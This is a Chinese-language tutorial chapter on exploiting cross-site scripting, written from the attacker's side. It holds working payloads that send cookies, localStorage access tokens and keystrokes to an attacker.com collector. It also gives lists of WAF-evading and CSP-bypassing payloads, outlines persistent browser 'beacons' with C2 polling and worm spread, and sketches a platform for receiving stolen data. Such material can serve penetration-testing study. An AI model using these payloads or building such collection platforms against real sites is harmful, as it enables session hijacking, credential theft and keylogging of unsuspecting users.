# XSS深入利用

### 2.1 存储型XSS实战场景

存储型 XSS 是危害最大的 XSS 类型， payload 持久化存储于服务端，影响所有访问该页面的用户。

**典型场景分析**

```
场景1：论坛/评论区
- 注入点：帖子正文或评论内容
- 存储位置：数据库
- 触发条件：其他用户浏览该帖子
- 危害：自动传播型蠕虫 XSS

场景2：用户资料页
- 注入点：昵称/签名/个人简介字段
- 存储位置：用户表
- 触发条件：管理员查看用户列表
- 危害：精准打击管理员账户

场景3：消息通知系统
- 注入点：私信标题或内容
- 存储位置：消息表
- 触发条件：接收者打开消息
- 危害：针对性攻击特定用户
```

### 2.2 DOM型XSS挖掘与利用

DOM 型 XSS 不经过服务端处理，完全在客户端 JavaScript 执行。挖掘核心是追踪**污点源到汇聚点**的数据流。

**常见污点源（Source）**

```javascript
location.hash          // URL 锚点
location.search        // 查询参数
document.referrer      // 来源 URL
document.cookie        // Cookie
window.name            // 窗口名称
postMessage            // 跨域消息
```

**常见汇聚点（Sink）**

```javascript
element.innerHTML      // HTML 注入
element.outerHTML
document.write()
eval()
setTimeout("string")  // 字符串参数执行
setInterval("string")
element.setAttribute('onclick', payload) // 事件属性
```

**挖掘流程**

1. 审计 JavaScript 代码中所有读取污点源的位置
2. 追踪数据流向，检查是否经过过滤
3. 确认数据最终是否到达汇聚点
4. 检查过滤函数是否可绕过

```
示例漏洞代码:
<script>
  var content = location.hash.substring(1);  // 污点源
  document.getElementById('output').innerHTML = unescape(content);  // 汇聚点（无过滤）
</script>

利用 payload:
http://target.com/page#<img src=x onerror=alert(document.cookie)>
```

### 2.3 XSS数据窃取

**Cookie窃取**

```javascript
// 基础 Cookie 窃取
new Image().src = 'https://attacker.com/log?c=' + document.cookie;

// 带 HttpOnly 绕过思路（需配合其他漏洞）:
// 若存在 CORS 配置错误或 PHPSESSID 通过 JS 可读，
// 可通过读取响应头获取 Set-Cookie
```

**LocalStorage / SessionStorage 窃取**

```javascript
// 窃取 LocalStorage 中存储的 Token
var token = localStorage.getItem('access_token');
new Image().src = 'https://attacker.com/log?t=' + encodeURIComponent(token);
```

**键盘记录器**

```javascript
// 简易键盘记录 payload
document.onkeypress = function() {
  var data = String.fromCharCode(window.event.keyCode);
  new Image().src = 'https://attacker.com/log?k=' + encodeURIComponent(data);
};
```

### 2.4 XSS Beacons（浏览器Botnet概念）

XSS Beacons 是指通过存储型 XSS 在目标用户的浏览器中植入持久化的"信标"脚本，使攻击者能够远程控制受害者的浏览器执行操作。

```
Beacon 功能概念:
├── 持久化：利用存储型 XSS 在页面中植入 JS，每次用户访问都重新加载
├── 命令分发：定时向 C2 服务器请求指令并执行
├── 内网代理：利用受害者浏览器作为跳板访问内网资源（同源策略保护下）
├── 信息收集：收集受害者浏览器指纹、局域网信息
└── 传播：蠕虫式自动传播 payload
```

### 2.5 XSS WAF绕过技术

**编码绕过**

```javascript
// HTML 实体编码
<img src=x onerror=alert(1)>       -- 原始
<img src=x onerror=&#97;lert(1)>   -- 十进制 HTML 实体
<img src=x onerror=&#x61;lert(1)>  -- 十六进制 HTML 实体

// JavaScript 编码
eval('\x61lert(1)')     -- 十六进制
eval('\u0061lert(1)')   -- Unicode 编码
eval(atob('YWxlcnQoMSk='))  -- Base64 解码
```

**标签混淆**

```javascript
<script>/*..*/alert(1)/*..*/</script>      -- 注释混淆
<svg/onload=alert(1)>                       -- SVG 标签
<details/open/ontoggle=alert(1)>            -- details 标签
<body/onload=alert(1)>                      -- body 标签
<input/onfocus=alert(1) autofocus>          -- input 标签
<select/onfocus=alert(1) autofocus>         -- select 标签
```

**事件处理器绕过**

```javascript
// 利用不常见事件处理器绕过黑名单
<img src=x onerror=alert(1)>              -- 常见
<img src=x ONERROR=alert(1)>              -- 大小写
<img src=x onerror =alert(1)>             -- 空格
<img src=x onerror/**/=alert(1)>           -- 注释
<img src=x onerror=/**/alert(1)>           -- 注释
```

### 2.6 CSP绕过技术

内容安全策略（CSP）是 XSS 防御的重要机制，但存在多种绕过方式：

| CSP 规则 | 绕过思路 |
|----------|----------|
| `script-src 'self'` | 上传 JS 文件到同源路径 |
| `script-src 'unsafe-inline'` | 直接内联执行 |
| `script-src 'nonce-xxx'` | 利用 DOM XSS 注入带 nonce 的 script 标签 |
| `script-src 'unsafe-eval'` | 利用 `eval()` / `Function()` |
| 包含受信任 CDN | 利用 CDN 上的 AngularJS 等框架绕过 |
| `script-src 'self' *.google.com` | 利用 google.com 域上的 JSONP 回调 |

**AngularJS CSP 绕过示例思路**

若 CSP 允许加载受信任域的脚本，且目标加载了 AngularJS：

```javascript
// AngularJS 的 Client-Side Template Injection 可绕过 CSP
// 原理：AngularJS 在客户端编译模板时执行表达式
<div ng-app>
  <div ng-csp>
    {{$eval.constructor('alert(1)')()}}
  </div>
</div>
```

### 2.7 XSS平台搭建与使用

XSS平台用于管理 XSS payload 和接收窃取的数据。自建平台核心组件包括：

```
XSS Platform 架构:
├── Payload 生成模块
│   ├── 通用 Cookie 窃取
│   ├── 键盘记录
│   ├── 页面截图
│   ├── 表单劫持
│   └── 内网信息探测
├── 数据接收模块
│   ├── 记录接口（接收被盗数据）
│   ├── 防重放去重
│   └── 数据分类存储
├── 管理后台
│   ├── 项目管理（不同目标不同项目）
│   ├── Payload 管理（生成/查看/删除）
│   ├── 数据查看
│   └── 统计分析
└── 安全防护
    ├── 平台自身防护
    └── 通信加密
```

---

---

